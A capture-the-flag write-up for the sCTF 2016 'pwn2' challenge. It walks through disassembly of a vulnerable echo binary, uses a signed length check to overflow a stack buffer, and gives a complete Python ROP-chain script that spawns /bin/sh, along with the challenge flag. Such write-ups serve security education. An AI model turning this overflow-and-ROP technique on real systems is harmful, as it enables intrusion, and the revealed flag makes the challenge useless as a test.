## pwn2 - 120 (Pwning) ##
#### Writeup by r3ndom_ #####
Created: 2016-4-15

### Problem ###
Update: A system call was changed to allow the binary to work on some 32 bit systems. This doesn't change the flag or how it's solved. Only enables 32 bit compatibility on those systems.

Echo servers are easy stuff, right?
`nc problems2.2016q1.sctf.io 1338`

### Hint ###
You're gonna need your utility belt, full of gadgets, to solve this one.

## Answer ##

### Overview ###
Figure out how to cause a buffer overflow and create a system call for execve on /bin/sh.

### Details ###

We open up the binary and yet again find that there is a function named vuln for us to look at, how convenient.

```asm
.text:0804852F                                      public vuln
.text:0804852F                      vuln            proc near               ; CODE XREF: main+31p
.text:0804852F
.text:0804852F                      nptr            = byte ptr -2Ch
.text:0804852F                      var_C           = dword ptr -0Ch
.text:0804852F
.text:0804852F 55                                   push    ebp
.text:08048530 89 E5                                mov     ebp, esp
.text:08048532 83 EC 48                             sub     esp, 48h
.text:08048535 C7 04 24 80 86 04 08                 mov     dword ptr [esp], offset format ; "How many bytes do you want me to read? "
.text:0804853C E8 2F FE FF FF                       call    _printf
.text:08048541 C7 44 24 04 04 00 00+                mov     dword ptr [esp+4], 4
.text:08048549 8D 45 D4                             lea     eax, [ebp+nptr]
.text:0804854C 89 04 24                             mov     [esp], eax
.text:0804854F E8 8F FF FF FF                       call    get_n
.text:08048554 8D 45 D4                             lea     eax, [ebp+nptr]
.text:08048557 89 04 24                             mov     [esp], eax      ; nptr
.text:0804855A E8 61 FE FF FF                       call    _atoi
.text:0804855F 89 45 F4                             mov     [ebp+var_C], eax
.text:08048562 83 7D F4 20                          cmp     [ebp+var_C], 20h
.text:08048566 7E 15                                jle     short loc_804857D
.text:08048568 8B 45 F4                             mov     eax, [ebp+var_C]
.text:0804856B 89 44 24 04                          mov     [esp+4], eax
.text:0804856F C7 04 24 A8 86 04 08                 mov     dword ptr [esp], offset aNoThatSizeDIsT ; "No! That size (%d) is too large!\n"
.text:08048576 E8 F5 FD FF FF                       call    _printf
.text:0804857B EB 39                                jmp     short locret_80485B6
.text:0804857D                      ; ---------------------------------------------------------------------------
.text:0804857D
.text:0804857D                      loc_804857D:                            ; CODE XREF: vuln+37j
.text:0804857D 8B 45 F4                             mov     eax, [ebp+var_C]
.text:08048580 89 44 24 04                          mov     [esp+4], eax
.text:08048584 C7 04 24 CC 86 04 08                 mov     dword ptr [esp], offset aOkSoundsGood_G ; "Ok, sounds good. Give me %u bytes of da"...
.text:0804858B E8 E0 FD FF FF                       call    _printf
.text:08048590 8B 45 F4                             mov     eax, [ebp+var_C]
.text:08048593 89 44 24 04                          mov     [esp+4], eax
.text:08048597 8D 45 D4                             lea     eax, [ebp+nptr]
.text:0804859A 89 04 24                             mov     [esp], eax
.text:0804859D E8 41 FF FF FF                       call    get_n
.text:080485A2 8D 45 D4                             lea     eax, [ebp+nptr]
.text:080485A5 89 44 24 04                          mov     [esp+4], eax
.text:080485A9 C7 04 24 F8 86 04 08                 mov     dword ptr [esp], offset aYouSaidS ; "You said: %s\n"
.text:080485B0 E8 BB FD FF FF                       call    _printf
.text:080485B5 90                                   nop
.text:080485B6
.text:080485B6                      locret_80485B6:                         ; CODE XREF: vuln+4Cj
.text:080485B6 C9                                   leave
.text:080485B7 C3                                   retn
.text:080485B7                      vuln            endp
```

Pretty straight-forward, get_n gets a string and then atoi converts it to a value.

Signed compare for if its too big, but buffer size is unsigned. Enter a negative value and you can enter as many characters as you want.

nptr is 0x30 from the stack buffer so we can get eip control like so:

```python
print '-1'
# Overflow
rop = ('A'*0x30)
```

Now the next value we write will be eip at the end of the function.

Now to build a syscall to execve, first we need "/bin/sh" in memory. So we call get_n with an address thats writeable.

```python
# Call the write thing
rop += '\xe3\x84\x04\x08' + '\x4e\x86\x04\x08'  + '\x24\xa0\x04\x08' + 'BBBB'
```

Essentially `get_n(0x804a024, 0x42424242);`

After that we can just print "/bin/sh\0" and get a C string for /bin/sh in the file.

Now we need to setup the syscall params.

```python
# Set eax to the proper value, 0xb
rop += '\x70\x83\x04\x08' + '\xe1\x84\x04\x08' + '\x24\xa0\x04\x08' # eax = 7
rop += '\xd3\x84\x04\x08'*4 # add 4 to eax
```

Here we print "/bin/sh" which will set `ecx` to 7 and coincidentally `ecx` will also end up being 7.

```python
# "/bin/sh", 0 is now at 0x804a024
# set ebx to that
rop += '\x76\x86\x04\x08' + '\x24\xa0\x04\x08'
```

Simply pop the ptr to "/bin/sh" into `ebx`

```python
# Ecx = ptr to 0
rop += '\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08'
```

This probably looks pretty cancer, and it is. This takes `ecx` and increments/doubles it up to be a pointer to zero, this is so that the argv/argc for /bin/sh are valid. (Also I wrote a script to generate this chain rather than me having to hand write it, generation script not included).

```python
# int 0x80
rop += '\xd0\x84\x04\x08'
print rop
print '/bin/sh\0'
```

And finally call execve to make the shell.

We print the rop chain and the input value for the get_n.


### Flag ###

The flag we get when running this on the server is `sctf{r0p_70_th3_f1n1sh}`


### Full Script ###

```python
print '-1'
# Overflow
rop = ('A'*0x30)

# Call the write thing
rop += '\xe3\x84\x04\x08' + '\x4e\x86\x04\x08'  + '\x24\xa0\x04\x08' + 'BBBB'

# Set eax to the proper value, 0xb
rop += '\x70\x83\x04\x08' + '\xe1\x84\x04\x08' + '\x24\xa0\x04\x08' # eax = 7
rop += '\xd3\x84\x04\x08'*4 # add 4 to eax

# "/bin/sh", 0 is now at 0x804a024
# set ebx to that
rop += '\x76\x86\x04\x08' + '\x24\xa0\x04\x08'

# Ecx = ptr to 0
rop += '\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08'

# int 0x80
rop += '\xd0\x84\x04\x08'

print rop
print '/bin/sh\0'
```
